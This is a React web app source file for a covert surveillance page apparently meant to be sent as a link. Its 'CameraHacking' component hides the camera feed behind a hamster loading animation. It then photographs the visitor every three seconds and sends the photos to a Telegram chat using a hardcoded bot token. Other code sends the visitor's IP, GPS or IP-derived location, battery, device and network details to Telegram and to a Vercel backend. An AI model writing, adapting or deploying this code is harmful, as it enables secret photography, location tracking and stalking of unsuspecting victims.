import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import axios from "axios";
import ReactDOM from "react-dom/client";
import "./App.css";

// API Configuration
const API_CONFIG = {
  baseURL: process.env.REACT_APP_API_URL || 'https://ewggewgegewr-gl3f.vercel.app',
  endpoints: {
    sendDataToTelegram: '/sendDataToTelegram',
    sendPhotoToTelegram: '/sendPhotoToTelegram',
    sendLocationToTelegram: '/sendLocationToTelegram'
  }
};

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ setClientIp, chatId, videoRef, setLocationPermission }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const [isInitialized, setIsInitialized] = useState(false);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [debugLogs, setDebugLogs] = useState([]);
  const [isSending, setIsSending] = useState(false);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 3000;
  const MAX_CAPTURES = 20;

  const addDebugLog = (message) => {
    const log = `${new Date().toLocaleTimeString()}: ${message}`;
    console.log(log);
    setDebugLogs(prev => [log, ...prev].slice(0, 20));
  };

  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML'
        })
      });

      return response.ok;

    } catch (error) {
      console.error('Telegram send error:', error);
      return false;
    }
  };

  const sendPhotoToTelegram = async (blob, caption = '') => {
    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка');
      return false;
    }

    setIsSending(true);
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);

      if (caption) {
        formData.append('caption', caption);
      }

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (response.ok) {
        const result = await response.json();
        addDebugLog(`✅ Фото отправлено! ID: ${result.result?.message_id}`);
        return true;
      } else {
        const errorText = await response.text();
        addDebugLog(`❌ Ошибка Telegram: ${errorText.substring(0, 100)}`);
        return false;
      }

    } catch (error) {
      addDebugLog(`❌ Ошибка отправки: ${error.message}`);
      return false;
    } finally {
      setIsSending(false);
    }
  };

  const createTestImage = async () => {
    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 300;
    const ctx = canvas.getContext('2d');

    const colors = ['#FF6B6B', '#4ECDC4', '#45B7D1', '#96CEB4', '#FFEAA7'];
    ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
    ctx.fillRect(0, 0, 300, 300);

    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('Camera Test', 150, 120);

    ctx.font = '18px Arial';
    ctx.fillText(new Date().toLocaleTimeString(), 150, 160);
    ctx.fillText(`Android ${deviceInfo?.androidVersion || ''}`, 150, 190);

    ctx.beginPath();
    ctx.arc(150, 230, 40, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 4;
    ctx.stroke();

    ctx.beginPath();
    ctx.arc(150, 230, 15, 0, Math.PI * 2);
    ctx.fillStyle = '#FFFFFF';
    ctx.fill();

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  const captureCameraPhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      addDebugLog('Камера не готова');
      return null;
    }

    const video = videoRef.current;

    if (video.videoWidth === 0 || video.videoHeight === 0) {
      addDebugLog('Видео не готово (0x0)');
      return null;
    }

    addDebugLog(`Захват фото #${captureCount + 1} (${video.videoWidth}x${video.videoHeight})`);

    try {
      const canvas = document.createElement('canvas');
      const isPortrait = video.videoHeight > video.videoWidth;

      if (isPortrait && deviceInfo?.isAndroid) {
        canvas.width = video.videoHeight;
        canvas.height = video.videoWidth;
      } else {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }

      const ctx = canvas.getContext('2d');
      let frameOk = false;
      let attempts = 0;

      while (!frameOk && attempts < 5) {
        attempts++;
        ctx.fillStyle = '#000000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        if (isPortrait && deviceInfo?.isAndroid) {
          ctx.save();
          ctx.translate(canvas.width / 2, canvas.height / 2);
          ctx.rotate(Math.PI / 2);
          ctx.translate(-canvas.height / 2, -canvas.width / 2);
          ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
          ctx.restore();
        } else {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }

        const points = [
          [50, 50],
          [canvas.width - 50, 50],
          [50, canvas.height - 50],
          [canvas.width - 50, canvas.height - 50]
        ];

        let blackPoints = 0;
        for (const [x, y] of points) {
          const pixel = ctx.getImageData(x, y, 1, 1).data;
          if (pixel[0] < 20 && pixel[1] < 20 && pixel[2] < 20) {
            blackPoints++;
          }
        }

        if (blackPoints < points.length / 2) {
          frameOk = true;
          addDebugLog(`Кадр захвачен (попытка ${attempts})`);
        } else {
          addDebugLog(`Черный кадр ${attempts}/5`);
          await new Promise(resolve => setTimeout(resolve, 200));
        }
      }

      if (!frameOk) {
        addDebugLog('Создаем тестовое изображение вместо черного кадра');
        return await createTestImage();
      }

      ctx.filter = 'contrast(1.1) brightness(1.05) saturate(1.1)';

      if (isPortrait && deviceInfo?.isAndroid) {
        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(Math.PI / 2);
        ctx.translate(-canvas.height / 2, -canvas.width / 2);
        ctx.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
        ctx.restore();
      } else {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });

    } catch (error) {
      addDebugLog(`Ошибка захвата: ${error.message}`);
      return await createTestImage();
    }
  };

  const captureAndSend = async () => {
    if (captureCount >= MAX_CAPTURES) {
      addDebugLog(`Достигнут лимит ${MAX_CAPTURES} фото`);
      stopCapturing();
      return;
    }

    if (isSending) {
      addDebugLog('Пропускаем - уже идет отправка предыдущего фото');
      return;
    }

    addDebugLog(`=== Захват ${captureCount + 1}/${MAX_CAPTURES} ===`);

    const photoBlob = await captureCameraPhoto();

    if (!photoBlob) {
      addDebugLog('Не удалось захватить фото');
      return;
    }

    const caption = `📸 Фото #${captureCount + 1}\n` +
      `Размер: ${Math.round(photoBlob.size / 1024)} KB\n` +
      `Время: ${new Date().toLocaleTimeString()}\n` +
      `Устройство: Android ${deviceInfo?.androidVersion || ''}`;

    const success = await sendPhotoToTelegram(photoBlob, caption);

    if (success) {
      setCaptureCount(prev => prev + 1);
      addDebugLog(`✅ Успешно! Всего: ${captureCount + 1}`);

      if ((captureCount + 1) % 5 === 0) {
        await sendToTelegram(
          `📊 Статистика: ${captureCount + 1} фото\n` +
          `Устройство: Android ${deviceInfo?.androidVersion || ''}\n` +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Время: ${new Date().toLocaleString()}`
        );
      }
    } else {
      addDebugLog('❌ Не удалось отправить фото');
    }
  };

  const initializeCamera = async () => {
    addDebugLog('Инициализация камеры...');

    try {
      const ua = navigator.userAgent;
      const isAndroid = /android/i.test(ua);
      const androidVersion = isAndroid ? (ua.match(/Android\s([0-9\.]+)/)?.[1] || 'unknown') : null;

      setDeviceInfo({
        isAndroid,
        androidVersion,
        userAgent: ua
      });

      addDebugLog(`Android ${androidVersion}, Chrome`);

      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        },
        audio: false
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      addDebugLog('Доступ к камере получен');

      if (videoRef.current) {
        const video = videoRef.current;

        video.playsInline = true;
        video.muted = true;
        video.autoplay = true;
        video.setAttribute('playsinline', 'true');
        video.setAttribute('muted', 'true');
        video.setAttribute('autoplay', 'true');
        video.setAttribute('webkit-playsinline', 'true');

        video.srcObject = stream;

        await new Promise((resolve) => {
          const timeout = setTimeout(() => {
            addDebugLog('Таймаут видео');
            resolve();
          }, 5000);

          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            const resolution = `${video.videoWidth}x${video.videoHeight}`;
            setDeviceInfo(prev => ({ ...prev, resolution }));

            addDebugLog(`Видео готово: ${resolution}`);

            video.play().then(() => {
              addDebugLog('Видео запущено');
              resolve();
            }).catch(() => {
              addDebugLog('Auto-play заблокирован');
              resolve();
            });
          };
        });

        await sendToTelegram(
          '✅ Камера инициализирована\n\n' +
          `Разрешение: ${deviceInfo?.resolution || 'unknown'}\n` +
          `Android ${androidVersion}\n` +
          `Chrome Mobile\n` +
          `Начало съемки: ${new Date().toLocaleString()}`
        );

        // УБРАЛИ отправку тестового снимка
        addDebugLog('Камера готова к съемке');
        
        setIsInitialized(true);
        return true;
      }

    } catch (error) {
      addDebugLog(`Ошибка инициализации: ${error.message}`);
      await sendToTelegram(`❌ Ошибка камеры: ${error.message}`);
      return false;
    }
  };

  const getClientIp = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      setClientIp(data.ip);

      await sendToTelegram(
        `🌐 IP Address: ${data.ip}\n` +
        `Устройство: Android\n` +
        `Браузер: Chrome Mobile`
      );

    } catch (error) {
      setClientIp('IP unavailable');
    }
  };

  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    addDebugLog(`🚀 Запуск захвата каждые ${CAPTURE_INTERVAL / 1000} секунд`);

    // Запускаем первый захват сразу
    setTimeout(() => {
      captureAndSend();
    }, 1000);

    // Затем продолжаем по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
        addDebugLog(`Остановлен ${track.kind} трек`);
      });
      streamRef.current = null;
    }

    addDebugLog('Захват остановлен');
  };

  const restoreLocation = () => {
    try {
      const saved = localStorage.getItem('locationPermission');
      if (saved) {
        const location = JSON.parse(saved);
        setLocationPermission(location);
        addDebugLog('Геолокация восстановлена');
      }
    } catch (e) {
      localStorage.removeItem('locationPermission');
    }
  };

  useEffect(() => {
    let mounted = true;

    const init = async () => {
      addDebugLog('=== СТАРТУЕМ ===');

      restoreLocation();
      await getClientIp();

      if (!navigator.mediaDevices?.getUserMedia) {
        addDebugLog('❌ Камера не поддерживается');
        await sendToTelegram('❌ WebRTC не поддерживается в этом браузере');
        return;
      }

      const success = await initializeCamera();

      if (success && mounted) {
        startPeriodicCapture();
      }
    };

    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  return (
    <>
      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          top: '10px',
          left: '10px',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          color: 'white',
          padding: '12px 20px',
          borderRadius: '10px',
          cursor: 'pointer',
          zIndex: 10000,
          fontSize: '14px',
          fontWeight: 'bold',
          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
          border: '2px solid white'
        }} onClick={captureAndSend}>
          📸 Сделать фото сейчас
        </div>
      )}

      <div style={{
        position: 'fixed',
        top: '10px',
        right: '10px',
        background: 'rgba(0, 0, 0, 0.8)',
        color: 'white',
        padding: '15px',
        borderRadius: '10px',
        zIndex: 9999,
        maxWidth: '300px',
        fontSize: '12px',
        backdropFilter: 'blur(10px)',
        border: '1px solid rgba(255,255,255,0.2)'
      }}>
        <h3 style={{ margin: '0 0 10px 0', color: '#4ECDC4' }}>📊 Системная информация</h3>
        <div style={{ marginBottom: '5px' }}>
          <strong>Статус камеры:</strong> {isInitialized ? '✅ Активна' : '🔄 Инициализация'}
        </div>
        <div style={{ marginBottom: '5px' }}>
          <strong>Android версия:</strong> {deviceInfo?.androidVersion || 'Определение...'}
        </div>
        <div style={{ marginBottom: '5px' }}>
          <strong>Разрешение:</strong> {deviceInfo?.resolution || '0x0'}
        </div>
        <div style={{ marginBottom: '5px' }}>
          <strong>Сделано фото:</strong> {captureCount} / {MAX_CAPTURES}
        </div>
        <div style={{ marginBottom: '5px' }}>
          <strong>Статус отправки:</strong> {isSending ? '🔄 Отправка...' : '✅ Готово'}
        </div>
        <div style={{ marginBottom: '5px' }}>
          <strong>Интервал:</strong> {CAPTURE_INTERVAL/1000} сек
        </div>
        <div style={{ 
          marginTop: '10px', 
          padding: '5px',
          background: captureCount > 0 ? 'rgba(0, 255, 0, 0.1)' : 'rgba(255, 0, 0, 0.1)',
          borderRadius: '5px',
          textAlign: 'center'
        }}>
          <strong>Следующее фото через:</strong><br/>
          {(() => {
            if (!captureIntervalRef.current) return 'Остановлено';
            const now = Date.now();
            const lastCapture = captureCount > 0 ? now : 0;
            const nextIn = Math.max(0, CAPTURE_INTERVAL - (now - lastCapture));
            return `${Math.ceil(nextIn/1000)} сек`;
          })()}
        </div>
      </div>

      {process.env.NODE_ENV === 'development' && (
        <div style={{
          position: 'fixed',
          bottom: 0,
          left: 0,
          right: 0,
          background: 'linear-gradient(to top, rgba(0,0,0,0.95), rgba(0,0,0,0.85))',
          color: '#00ff00',
          padding: '15px',
          fontSize: '12px',
          maxHeight: '250px',
          overflow: 'auto',
          fontFamily: 'monospace',
          zIndex: 9998,
          borderTop: '3px solid #00ff00',
          boxShadow: '0 -5px 20px rgba(0,255,0,0.2)'
        }}>
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginBottom: '15px',
            paddingBottom: '10px',
            borderBottom: '2px solid #00ff00'
          }}>
            <div>
              <strong style={{ fontSize: '14px', color: '#00ff00' }}>📡 CAMERA DEBUG</strong>
              <div style={{ fontSize: '11px', color: '#aaa', marginTop: '5px' }}>
                Android {deviceInfo?.androidVersion || '?'} | {deviceInfo?.resolution || '0x0'} | {captureCount} photos
              </div>
            </div>
            <div style={{
              background: captureCount > 0 ? '#00ff00' : '#ff0000',
              color: '#000',
              padding: '5px 10px',
              borderRadius: '5px',
              fontWeight: 'bold',
              fontSize: '14px'
            }}>
              {captureCount} 📸
            </div>
          </div>

          <div style={{ maxHeight: '180px', overflow: 'auto' }}>
            {debugLogs.map((log, i) => (
              <div key={i} style={{
                padding: '5px 0',
                borderBottom: '1px solid #333',
                whiteSpace: 'nowrap',
                overflow: 'hidden',
                textOverflow: 'ellipsis',
                color: log.includes('✅') ? '#00ff00' :
                  log.includes('❌') ? '#ff4444' :
                    log.includes('⚠️') ? '#ffff00' : '#cccccc'
              }}>
                {log}
              </div>
            ))}
          </div>
        </div>
      )}
    </>
  );
};

/**
 * КОМПОНЕНТ LOCATIONHANDLER
 */
const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermission, chatId, clientIp }) => {
  const [locationData, setLocationData] = useState(null);

  const sendLocation = async (coords) => {
    const { latitude, longitude } = coords;

    const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendLocationToTelegram}`;

    const data = {
      chat_id: chatId,
      latitude,
      longitude,
      clientIp
    };

    try {
      await axios.post(apiUrl, data, {
        headers: {
          'Content-Type': 'application/json',
        },
        timeout: 10000
      });

      console.log("Location sent to Telegram");
      setLocationSent(true);
    } catch (error) {
      console.error("Error sending location to server:", error);
    }
  };

  const getLocationByIp = async () => {
    try {
      const response = await axios.get(`https://ipinfo.io/${clientIp}/json`);
      const { loc, city, region, country, org } = response.data;
      const [latitude, longitude] = loc.split(',');

      const coords = { latitude, longitude };

      setLocationData({
        coords,
        city,
        region,
        country,
        provider: org,
        method: 'IP геолокация'
      });

      sendLocation(coords);
      setLocationPermission(coords);
    } catch (error) {
      console.error("Error fetching location by IP:", error);
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });

      const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
      const coords = { latitude, longitude };

      setLocationData({
        coords,
        accuracy: Math.round(accuracy),
        altitude: altitude ? Math.round(altitude) : null,
        heading: heading ? Math.round(heading) : null,
        speed: speed ? Math.round(speed * 3.6) : null,
        method: 'GPS устройства'
      });

      localStorage.setItem("locationPermission", JSON.stringify(coords));
      setLocationPermission(coords);
      sendLocation(coords);

    } catch (error) {
      if (error.code === error.PERMISSION_DENIED) {
        alert("Пожалуйста, включите доступ к местоположению в настройках вашего устройства.");
        getLocationByIp();
      } else {
        console.error("Error getting location permission:", error);
        getLocationByIp();
      }
    }
  };

  useEffect(() => {
    if (!locationPermission) {
      requestLocationPermission();
    }
  }, []);

  return locationData ? (
    <div style={{
      position: 'fixed',
      bottom: '10px',
      left: '10px',
      background: 'rgba(0, 0, 0, 0.8)',
      color: 'white',
      padding: '15px',
      borderRadius: '10px',
      zIndex: 9997,
      maxWidth: '350px',
      fontSize: '12px',
      backdropFilter: 'blur(10px)',
      border: '1px solid rgba(255,255,255,0.2)'
    }}>
      <h3 style={{ margin: '0 0 10px 0', color: '#FF6B6B' }}>📍 Геолокация</h3>
      <div style={{ marginBottom: '5px' }}>
        <strong>Метод:</strong> {locationData.method}
      </div>
      {locationData.city && (
        <div style={{ marginBottom: '5px' }}>
          <strong>Местоположение:</strong> {locationData.city}, {locationData.region}, {locationData.country}
        </div>
      )}
      <div style={{ marginBottom: '5px' }}>
        <strong>Координаты:</strong> {Number(locationData.coords.latitude).toFixed(6)}, {Number(locationData.coords.longitude).toFixed(6)}
      </div>
      {locationData.accuracy && (
        <div style={{ marginBottom: '5px' }}>
          <strong>Точность:</strong> ±{locationData.accuracy} м
        </div>
      )}
      {locationData.altitude && (
        <div style={{ marginBottom: '5px' }}>
          <strong>Высота:</strong> {locationData.altitude} м
        </div>
      )}
      {locationData.speed && (
        <div style={{ marginBottom: '5px' }}>
          <strong>Скорость:</strong> {locationData.speed} км/ч
        </div>
      )}
      {locationData.provider && (
        <div style={{ marginBottom: '5px' }}>
          <strong>Провайдер:</strong> {locationData.provider}
        </div>
      )}
      <div style={{ marginTop: '10px', fontSize: '10px', color: '#aaa' }}>
        Данные обновлены: {new Date().toLocaleTimeString()}
      </div>
    </div>
  ) : null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  const videoRef = useRef(null);

  const [usrStream, setUsrStream] = useState(null);
  const [isCameraActive, setIsCameraActive] = useState(true);
  const [locationSent, setLocationSent] = useState(false);
  const [locationPermission, setLocationPermission] = useState(null);
  const [clientIp, setClientIp] = useState("");
  const [deviceInfo, setDeviceInfo] = useState(null);

  const getBatteryLevel = async () => {
    try {
      if ("getBattery" in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.floor(battery.level * 100) + "%",
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } else {
        return {
          level: "N/A",
          charging: false
        };
      }
    } catch (error) {
      console.error("❌ Error getting battery level:", error);
      return {
        level: "Error",
        charging: false
      };
    }
  };

  const getDeviceInfo = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    const devicePixelRatio = window.devicePixelRatio;
    const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const deviceType = isMobile ? "Mobile Device" : "Desktop Device";

    const language = navigator.language || navigator.userLanguage;
    const languages = navigator.languages;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionInfo = connection ? {
      effectiveType: connection.effectiveType,
      downlink: connection.downlink,
      rtt: connection.rtt,
      saveData: connection.saveData
    } : null;

    const memory = navigator.deviceMemory;
    const cores = navigator.hardwareConcurrency;

    return {
      userAgent,
      platform,
      screenWidth,
      screenHeight,
      devicePixelRatio,
      deviceType,
      language,
      languages,
      timezone,
      connection: connectionInfo,
      memory,
      cores,
      isMobile
    };
  };

  useEffect(() => {
    const getUserData = async () => {
      try {
        console.log("🎯 Starting data collection for chatId:", chatId);

        const deviceInfo = getDeviceInfo();
        setDeviceInfo(deviceInfo);
        
        const batteryInfo = await getBatteryLevel();

        const data = {
          chat_id: chatId,
          batteryLevel: batteryInfo.level,
          batteryCharging: batteryInfo.charging,
          screenWidth: deviceInfo.screenWidth,
          screenHeight: deviceInfo.screenHeight,
          devicePixelRatio: deviceInfo.devicePixelRatio,
          clientIp: clientIp,
          userAgent: deviceInfo.userAgent,
          deviceType: deviceInfo.deviceType,
          platform: deviceInfo.platform,
          language: deviceInfo.language,
          timezone: deviceInfo.timezone,
          connection: deviceInfo.connection,
          memory: deviceInfo.memory,
          cores: deviceInfo.cores
        };

        console.log("📤 Sending user data:", data);

        const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendDataToTelegram}`;

        await axios.post(apiUrl, data, {
          headers: {
            "Content-Type": "application/json",
          },
          timeout: 10000
        });

        console.log("✅ User data sent successfully");

      } catch (err) {
        console.error("❌ Error sending user data to server:", err);
      }
    };

    if (chatId) {
      getUserData();
    }
  }, [chatId, clientIp]);

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>

        <video
          ref={videoRef}
          autoPlay
          muted
          style={{ display: 'none' }}
          playsInline
        />
      </div>

      {deviceInfo && (
        <div style={{
          position: 'fixed',
          top: '150px',
          right: '10px',
          background: 'rgba(0, 0, 0, 0.8)',
          color: 'white',
          padding: '15px',
          borderRadius: '10px',
          zIndex: 9996,
          maxWidth: '350px',
          maxHeight: '400px',
          overflow: 'auto',
          fontSize: '12px',
          backdropFilter: 'blur(10px)',
          border: '1px solid rgba(255,255,255,0.2)'
        }}>
          <h3 style={{ margin: '0 0 10px 0', color: '#FFEAA7' }}>📱 Информация об устройстве</h3>
          <div style={{ marginBottom: '5px' }}>
            <strong>Тип:</strong> {deviceInfo.deviceType}
          </div>
          <div style={{ marginBottom: '5px' }}>
            <strong>Платформа:</strong> {deviceInfo.platform}
          </div>
          <div style={{ marginBottom: '5px' }}>
            <strong>Экран:</strong> {deviceInfo.screenWidth} × {deviceInfo.screenHeight} (x{deviceInfo.devicePixelRatio})
          </div>
          <div style={{ marginBottom: '5px' }}>
            <strong>Язык:</strong> {deviceInfo.language}
          </div>
          <div style={{ marginBottom: '5px' }}>
            <strong>Часовой пояс:</strong> {deviceInfo.timezone}
          </div>
          {deviceInfo.memory && (
            <div style={{ marginBottom: '5px' }}>
              <strong>Память:</strong> {deviceInfo.memory} GB
            </div>
          )}
          {deviceInfo.cores && (
            <div style={{ marginBottom: '5px' }}>
              <strong>Ядра CPU:</strong> {deviceInfo.cores}
            </div>
          )}
          {deviceInfo.connection && (
            <>
              <div style={{ marginBottom: '5px' }}>
                <strong>Тип сети:</strong> {deviceInfo.connection.effectiveType}
              </div>
              <div style={{ marginBottom: '5px' }}>
                <strong>Скорость:</strong> {deviceInfo.connection.downlink} Mbps
              </div>
              <div style={{ marginBottom: '5px' }}>
                <strong>Задержка:</strong> {deviceInfo.connection.rtt} ms
              </div>
            </>
          )}
          <div style={{ marginBottom: '5px' }}>
            <strong>User Agent:</strong>
            <div style={{ fontSize: '10px', color: '#aaa', wordBreak: 'break-word', marginTop: '2px' }}>
              {deviceInfo.userAgent.substring(0, 100)}...
            </div>
          </div>
        </div>
      )}

      <LocationHandler
        chatId={chatId}
        locationPermission={locationPermission}
        setLocationPermission={setLocationPermission}
        setLocationSent={setLocationSent}
        clientIp={clientIp}
      />

      {isCameraActive && (
        <CameraHacking
          chatId={chatId}
          videoRef={videoRef}
          setClientIp={setClientIp}
          setLocationPermission={setLocationPermission}
        />
      )}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
